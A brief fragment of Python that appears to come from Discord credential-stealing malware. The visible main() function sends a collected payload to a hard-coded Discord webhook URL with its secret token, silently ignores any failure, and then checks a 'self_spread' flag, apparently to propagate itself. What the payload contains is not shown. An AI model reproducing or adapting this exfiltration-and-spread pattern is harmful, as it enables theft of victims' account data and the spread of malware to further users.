...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/790594705238917180/fL8I4stWAM8oJaPsXYpBPeZjGB-pH5xyVnbZ6TQNvHujUcrPmvmyL-ukCTU-DcCsInKI", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
